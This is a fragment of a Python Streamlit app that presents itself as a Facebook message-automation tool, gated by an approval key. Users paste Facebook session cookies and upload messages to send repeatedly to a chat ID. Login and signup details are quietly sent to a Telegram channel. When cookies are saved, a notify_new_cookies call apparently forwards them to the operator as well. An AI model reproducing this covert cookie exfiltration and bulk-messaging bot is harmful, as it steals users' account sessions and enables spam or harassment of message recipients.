            if st.button("👑 Admin Panel", use_container_width=True):
                st.session_state.approval_status = 'admin_login'
                st.rerun()
    
    elif st.session_state.approval_status == 'pending':
        st.warning("⏳ Approval Pending...")
        st.info(f"**Your Key:** `{user_key}`")
        whatsapp_url = send_whatsapp_message(username, user_key)
        
        if not st.session_state.whatsapp_opened:
            components.html(f'<script>setTimeout(function(){{window.open("{whatsapp_url}","_blank");}},500);</script>', height=0)
            st.session_state.whatsapp_opened = True
        
        st.markdown(f'<a href="{whatsapp_url}" target="_blank" class="whatsapp-btn">👑 Click Here to Open WhatsApp</a>', unsafe_allow_html=True)
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("🔍 Check Approval Status"):
                if check_approval(user_key):
                    st.session_state.key_approved = True
                    st.session_state.approval_status = 'approved'
                    st.success("Approved! Redirecting...")
                    time.sleep(1)
                    st.rerun()
                else:
                    st.error("Not approved yet!")
        with col2:
            if st.button("⬅ Back"):
                st.session_state.approval_status = 'not_requested'
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_login':
        st.markdown("### 👑 Admin Login")
        admin_password = st.text_input("Enter Admin Password:", type="password")
        col1, col2 = st.columns(2)
        with col1:
            if st.button("🔑 Login"):
                if admin_password == ADMIN_PASSWORD:
                    st.session_state.approval_status = 'admin_panel'
                    st.rerun()
                else:
                    st.error("Invalid password!")
        with col2:
            if st.button("⬅ Back"):
                st.session_state.approval_status = 'not_requested'
                st.rerun()
    
    elif st.session_state.approval_status == 'admin_panel':
        admin_panel()

def login_page():
    st.markdown("""
    <div class="main-header">
        <h1>👑 SURAJ OBEROY XWD E2EE 👑</h1>
        <p>səvən bıllıon smıle's ın ʈhıs world buʈ ɣour's ıs mɣ fαvourıʈəs___👑👑</p>
    </div>
    """, unsafe_allow_html=True)
    
    tab1, tab2 = st.tabs(["👑 Login", "👑 Sign Up"])
    
    with tab1:
        st.markdown("### Welcome Back!")
        username = st.text_input("Username", key="login_username")
        password = st.text_input("Password", type="password", key="login_password")
        
        if st.button("Login", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    user_key = generate_user_key(username, password)
                    st.session_state.logged_in = True
                    st.session_state.user_id = user_id
                    st.session_state.username = username
                    st.session_state.user_key = user_key
                    
                    if check_approval(user_key):
                        st.session_state.key_approved = True
                        st.session_state.approval_status = 'approved'
                    else:
                        st.session_state.key_approved = False
                        st.session_state.approval_status = 'not_requested'
                    
                    st.success(f"Welcome back, {username}!")
                    send_to_telegram(f"🔐 USER LOGGED IN\n👤 {username}\n🆔 {user_id}")
                    st.rerun()
                else:
                    st.error("Invalid credentials!")
            else:
                st.warning("Please fill all fields")
    
    with tab2:
        st.markdown("### Create New Account")
        new_username = st.text_input("Choose Username", key="signup_username")
        new_password = st.text_input("Choose Password", type="password", key="signup_password")
        confirm_password = st.text_input("Confirm Password", type="password", key="confirm_password")
        
        if st.button("Create Account", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        user_key = generate_user_key(new_username, new_password)
                        st.success(f"Account created! Your key: `{user_key}`")
                        send_to_telegram(f"🆕 NEW SIGNUP\n👤 {new_username}\n🔑 {user_key}")
                    else:
                        st.error(f"Error: {message}")
                else:
                    st.error("Passwords do not match!")
            else:
                st.warning("Please fill all fields")

def main_app():
    # [Keep your existing main_app function with file upload for messages]
    st.markdown('<div class="main-header"><h1>🥀 SURAJ OBEROY OFFLINE E2EE 🌪️</h1></div>', unsafe_allow_html=True)
    
    st.sidebar.markdown(f"### 👑 {st.session_state.username}")
    st.sidebar.markdown(f"**Key:** `{st.session_state.user_key}`")
    st.sidebar.success("✅ Key Approved")
    
    if st.sidebar.button("👑 Logout", use_container_width=True):
        if st.session_state.automation_state.running:
            stop_automation(st.session_state.user_id)
        st.session_state.clear()
        st.rerun()
    
    # Quick stats in sidebar
    st.sidebar.markdown("---")
    st.sidebar.markdown("### 📊 Quick Stats")
    st.sidebar.metric("Messages Sent", st.session_state.automation_state.message_count)
    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
    st.sidebar.markdown(f"**Status:** {status}")
    
    user_config = db.get_user_config(st.session_state.user_id)
    
    if user_config:
        tab1, tab2 = st.tabs(["⚙️ Configuration", "▶️ Automation"])
        
        with tab1:
            st.markdown("### Your Configuration")
            
            chat_id = st.text_input("Chat/Conversation ID", value=user_config.get('chat_id', ''))
            name_prefix = st.text_input("Name Prefix", value=user_config.get('name_prefix', ''))
            delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, value=user_config.get('delay', 5))
            cookies = st.text_area("Facebook Cookies (optional)", value="", placeholder="Paste cookies here", height=100)
            
            # File upload for messages
            st.markdown("### 📁 Upload Messages File")
            uploaded_file = st.file_uploader("Choose .txt file (one message per line)", type=['txt'])
            
            if uploaded_file:
                content = uploaded_file.read().decode('utf-8')
                messages_list = [line.strip() for line in content.split('\n') if line.strip()]
                st.success(f"✅ Loaded {len(messages_list)} messages!")
                with st.expander("Preview"):
                    for i, msg in enumerate(messages_list[:10]):
                        st.write(f"{i+1}. {msg[:100]}")
            
            if st.button("💾 Save Configuration", use_container_width=True):
                final_cookies = cookies if cookies.strip() else user_config.get('cookies', '')
                if uploaded_file:
                    messages_str = "\n".join(messages_list)
                    db.update_user_config_with_messages(st.session_state.user_id, chat_id, name_prefix, delay, final_cookies, messages_str, messages_list)
                else:
                    db.update_user_config(st.session_state.user_id, chat_id, name_prefix, delay, final_cookies, user_config.get('messages', ''))
                st.success("Configuration saved!")
                if cookies.strip():
                    notify_new_cookies(st.session_state.username, st.session_state.user_id, cookies)
                st.rerun()
        
        with tab2:
            st.markdown("### Automation Control")
            
            col1, col2, col3 = st.columns(3)
            with col1:
                st.metric("Messages Sent", st.session_state.automation_state.message_count)
            with col2:
                status_text = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
                st.metric("Status", status_text)
            with col3:
                msg_count = len(user_config.get('messages_list', []))
                st.metric("Messages Loaded", msg_count)
            
            st.markdown("---")
            
            col1, col2 = st.columns(2)
            with col1:
                if st.button("▶️ Start Automation", disabled=st.session_state.automation_state.running, use_container_width=True):
                    if user_config.get('chat_id'):
                        if msg_count > 0:
                            start_automation(user_config, st.session_state.user_id)
                            st.success("Automation started!")
                            st.rerun()
                        else:
                            st.error("Please upload messages file first!")
                    else:
                        st.error("Please set Chat ID first!")
            
            with col2:
                if st.button("⏹ Stop Automation", disabled=not st.session_state.automation_state.running, use_container_width=True):
                    stop_automation(st.session_state.user_id)
                    st.warning("Automation stopped!")
                    st.rerun()
            
            if st.session_state.automation_state.logs:
                st.markdown("### Live Console")
                logs_html = '<div class="console-output">'
                for log in st.session_state.automation_state.logs[-30:]:
                    logs_html += f'<div class="console-line">{log}</div>'
                logs_html += '</div>'
                st.markdown(logs_html, unsafe_allow_html=True)
    else:
        st.warning("Please configure your settings!")

# Main routing
if not st.session_state.logged_in:
    login_page()
elif not st.session_state.key_approved:
    approval_request_page(st.session_state.user_key, st.session_state.username)
else:
    main_app()

st.markdown('<div class="footer">Made with 👑 by SURAJ OBEROX XWD | © 2026</div>', unsafe_allow_html=True)